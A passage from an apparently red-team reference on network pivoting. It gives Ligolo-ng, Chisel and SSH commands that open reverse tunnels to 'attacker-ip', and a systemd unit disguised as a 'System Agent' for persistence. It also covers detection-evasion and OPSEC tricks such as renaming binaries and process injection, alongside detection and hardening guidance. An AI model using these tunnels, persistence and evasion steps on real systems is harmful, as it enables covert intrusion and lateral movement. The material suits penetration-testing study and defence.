# Ligolo-ng (agent connects outbound to proxy -- NAT-friendly by design)
./agent -connect attacker-ip:11601 -ignore-cert

# For double NAT scenarios, use a cloud relay:
# Deploy VPS as relay point
# Both pivot and attacker connect to VPS
```

#### Tunnel Stability and Persistence

```bash
# SSH keep-alive and auto-reconnect
ssh -o ServerAliveInterval=60 -o ServerAliveCountMax=3 user@pivot

# autossh for automatic reconnection
autossh -M 0 -o "ServerAliveInterval 60" -o "ServerAliveCountMax 3" -D 1080 user@pivot

# Chisel with retry
chisel client --keepalive 25s attacker-ip:8080 R:socks

# Ligolo-ng agent with retry
./agent -connect attacker-ip:11601 -ignore-cert -retry

# systemd service for persistent tunnel (if root on pivot)
# /etc/systemd/system/tunnel.service
# [Unit]
# Description=System Agent
# After=network.target
#
# [Service]
# Type=simple
# ExecStart=/opt/.agent -connect attacker-ip:11601 -ignore-cert -retry
# Restart=always
# RestartSec=30
#
# [Install]
# WantedBy=multi-user.target
```

---

## 2025 Techniques

### Ligolo-ng v0.7+ Improvements (2025)

Ligolo-ng saw significant updates in 2025 with improved session management, better stability for long-running tunnels, and enhanced listener capabilities. The tool now supports UDP forwarding in addition to TCP, making it viable for DNS relay and other UDP-based protocols through the tunnel. TLS certificate pinning was added to prevent MITM attacks on the agent-proxy communication channel.

### Encrypted Tunnel Detection Evasion

Modern network detection systems (NTA/NDR) in 2025 increasingly use JA3/JA4 fingerprinting and encrypted traffic analysis (ETA) to identify tunneling tools. Red teams have responded by:

- **JA3 randomization**: Tools like Ligolo-ng and Chisel now support TLS configuration options to modify their JA3 fingerprints to match common browsers.
- **Domain fronting alternatives**: With major CDN providers blocking domain fronting, operators have shifted to using legitimate cloud service APIs (Azure CDN, CloudFront with custom origins) to mask tunnel traffic.
- **HTTP/2 and HTTP/3 tunneling**: Newer versions of tunneling tools support HTTP/2 multiplexing and QUIC-based transport, which better mimics legitimate web traffic patterns.

### Cloud-Native Pivoting Advances

The 2025 landscape has seen increased use of cloud-native services as pivot infrastructure:

- **AWS Systems Manager tunnels** are increasingly abused since they use the legitimate SSM agent already deployed on managed instances, generating traffic that is difficult to distinguish from normal management operations.
- **Azure Relay Hybrid Connections** provide WebSocket-based tunneling through Azure's infrastructure, appearing as legitimate Azure management traffic.
- **GCP Identity-Aware Proxy (IAP)** tunneling allows SSH and TCP forwarding through Google's infrastructure with standard OAuth authentication.

### DNS-over-HTTPS (DoH) Tunneling

Traditional DNS tunneling tools generate obviously anomalous query patterns to corporate DNS resolvers. In 2025, tools have emerged that leverage DNS-over-HTTPS to tunnel through providers like Cloudflare (1.1.1.1/dns-query) and Google (dns.google/dns-query), making the traffic appear as standard HTTPS to network monitors. This bypasses both DNS inspection and traditional DNS tunnel detection.

### WireGuard-Based Pivoting

WireGuard's lightweight kernel-mode VPN has been adapted for red team pivoting. Its minimal overhead, fast handshake, and support for roaming make it attractive for persistent tunnel infrastructure. Tools wrapping WireGuard for offensive use allow operators to deploy a WireGuard interface on a compromised host and establish a full VPN tunnel back to the attacker's infrastructure with minimal detectable footprint compared to traditional VPN solutions.

---

## Detection & Defense

### Network-Level Detection

```
Log Sources:
- NetFlow/IPFIX data for unusual traffic patterns
- DNS query logs (volume, entropy, query length)
- ICMP traffic logs (payload size, frequency)
- HTTP/S proxy logs (WebSocket upgrades, long-lived connections)
- VPC Flow Logs (cloud environments)

Detection Indicators:
- SSH connections from unexpected sources or to unexpected destinations
- Abnormally long SSH sessions with sustained data transfer
- DNS queries with high entropy subdomains or unusual record types
- ICMP packets with payloads exceeding typical ping sizes (>64 bytes)
- HTTP connections with sustained bidirectional data flow (WebSocket)
- Single hosts communicating with an unusually high number of internal hosts
- Beaconing patterns (regular interval connections)
```

### Host-Level Detection

```
Log Sources:
- Sysmon (Event ID 1: Process Creation, Event ID 3: Network Connection)
- Windows Security Event Log (Event ID 4688: Process Creation)
- Linux audit logs (auditd socket creation)
- EDR telemetry (process-to-network mapping)

Detection Indicators:
- Processes establishing SOCKS proxy listeners (port 1080, 9050)
- TUN/TAP interface creation on systems that should not have VPN software
- Known tunneling tool hashes or binary names (chisel, ligolo, agent)
- SSH processes with -D, -L, -R flags (command line monitoring)
- Unusual child processes of svchost.exe or web server processes
- New listening ports on pivot hosts
```

### Hardening Measures

```
- Implement strict egress filtering (allowlist approach)
- Deploy network segmentation with microsegmentation policies
- Monitor and restrict SSH access with jump host architecture
- Block unnecessary ICMP types at the firewall
- Implement DNS filtering and monitoring (block direct external DNS)
- Use TLS inspection for outbound HTTPS traffic
- Deploy NDR/NTA solutions with tunnel detection capabilities
- Monitor for new TUN/TAP interface creation via auditd/Sysmon
- Restrict outbound connectivity from servers (only allow necessary ports)
- Implement network access control (802.1X) to prevent rogue pivot hosts
```

---

## OPSEC Considerations

1. **Tool Selection**: Choose tunneling tools that generate traffic consistent with the environment. SSH in a Linux environment is normal; SSH from a Windows IIS server is suspicious.

2. **Traffic Blending**: Match tunnel traffic to expected patterns. Use standard ports (443, 80, 53), standard TLS libraries, and normal user-agent strings.

3. **Bandwidth Management**: Avoid high-volume scans through tunnels. Large nmap scans through a SOCKS proxy generate detectable traffic spikes. Stage scans slowly.

4. **Binary Deployment**: Rename tunneling binaries to blend with the host (e.g., rename `chisel` to `svchost.exe` or `java`). Remove binaries after use.

5. **Process Hiding**: Run tunneling agents under legitimate parent processes when possible. Use process hollowing or injection to hide tunnel processes.

6. **Timestamp Awareness**: Tunneling tools create files, modify registry entries, and generate log entries. Track all artifacts for cleanup.

7. **Kill Switch**: Have a rapid tunnel teardown plan. Use ControlMaster's `-O exit` for SSH, or implement a timeout-based self-destruct in tunnel agents.

8. **DNS Tunnel OPSEC**: Throttle DNS query rates to avoid triggering volume-based detection. Use common record types (A, AAAA) rather than TXT or NULL records. Keep subdomain labels under 63 characters.

9. **Encryption**: Always use encrypted tunnels. Unencrypted traffic through tunnels exposes credentials and data to network inspection.

10. **Pivot Logging**: Maintain your own log of established tunnels, ports, and routes. Losing track of active tunnels can leave artifacts and expose the operation.

---

## Cross-References

- [../06-defense-evasion/anti-forensics.md](../06-defense-evasion/anti-forensics.md) -- Cleaning up pivot artifacts
- [../11-command-and-control/README.md](../11-command-and-control/README.md) -- C2 channel setup through tunnels
- [../08-discovery/README.md](../08-discovery/README.md) -- Network discovery through pivot hosts
- [../02-initial-access/README.md](../02-initial-access/README.md) -- Gaining initial foothold for pivoting
- [../05-privilege-escalation/README.md](../05-privilege-escalation/README.md) -- Escalating on pivot hosts
- [../13-cloud-security/README.md](../13-cloud-security/README.md) -- Cloud-specific pivoting techniques

---

## References

- MITRE ATT&CK T1572 - Protocol Tunneling: https://attack.mitre.org/techniques/T1572/
- MITRE ATT&CK T1090 - Proxy: https://attack.mitre.org/techniques/T1090/
- MITRE ATT&CK T1021 - Remote Services: https://attack.mitre.org/techniques/T1021/
- Ligolo-ng Documentation: https://docs.ligolo.ng/
- Ligolo-ng GitHub: https://github.com/nicocha30/ligolo-ng
- Chisel GitHub: https://github.com/jpillora/chisel
- Internal All The Things - Network Pivoting: https://swisskyrepo.github.io/InternalAllTheThings/redteam/pivoting/network-pivoting-techniques/
- Mastering Pivoting (2025 Guide): https://cyberxsociety.com/mastering-pivoting-in-penetration-testing-from-basics-to-advanced-2025-guide/
- RBT Security SSH Tunneling Series: https://www.rbtsec.com/blog/ssh-tunneling-part-3/
- Pivoting with SSH Tunnels (2025): https://northgreensecurity.com/2025/04/08/pivoting-with-ssh-tunnels/
- Neo-reGeorg GitHub: https://github.com/L-codes/Neo-reGeorg
- MITRE ATT&CK Neo-reGeorg S1189: https://attack.mitre.org/software/S1189/
- dnscat2 GitHub: https://github.com/iagox86/dnscat2
- Iodine GitHub: https://github.com/yarrick/iodine
- ptunnel-ng GitHub: https://github.com/utoni/ptunnel-ng
- DNS Tunneling Detection (2025): https://version-2.com/en/2025/07/cracking-the-tunnel-how-to-detect-and-defend-against-dns-tunneling-in-2025/
- AWS SSM Port Forwarding: https://repost.aws/knowledge-center/systems-manager-ssh-vpc-resources
- HideAndSec Pivoting Cheatsheet: https://hideandsec.sh/books/cheatsheets-82c/page/pivoting
- Overview of Network Pivoting and Tunneling (Rawsec): https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/
- NordBySec - Ligolo-NG (2025): https://nordbysec.com/2025/04/13/pivoting-through-the-network-the-power-of-ligolo-ng/
